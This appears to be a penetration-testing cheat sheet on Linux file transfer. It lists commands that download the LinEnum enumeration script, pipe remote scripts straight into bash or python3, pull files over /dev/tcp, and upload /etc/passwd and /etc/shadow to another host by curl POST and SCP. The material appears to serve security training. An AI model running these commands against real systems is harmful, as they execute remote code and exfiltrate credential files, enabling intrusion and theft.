## Downloads

### Web Downloads
```bash
## wget download
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh

## cURL download
curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh

## Invoking file without downloading
wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3

curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```

### Bash Download
Minimum ver 2.0.4 Bash required. Built-in /dev/TCP device used for download.

```bash
## Connect to Target Webserver
exec 3<>/dev/tcp/10.10.10.32/80

## HTTP GET Request
echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3

## Print response
cat <&3
```

### SSH Download

```bash
## Enable SSH Server
sudo systemctl enable ssh

## Start SSH Server
sudo systemctl start ssh

## SCP download
scp plaintext@192.168.49.128:/root/myroot.txt . 
```

## Uploads

### Web Upload

```bash
## Start webserver
sudo python3 -m pip install --user uploadserver

## Creating self-signed certificate
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'

## Start Web Server
mkdir https && cd https

sudo python3 -m uploadserver 443 --server-certificate /root/server.pem

## Uplaoding (multiple) files
curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```

### SCP Upload

```bash
scp /etc/passwd plaintext@192.168.49.128:/home/plaintext/
```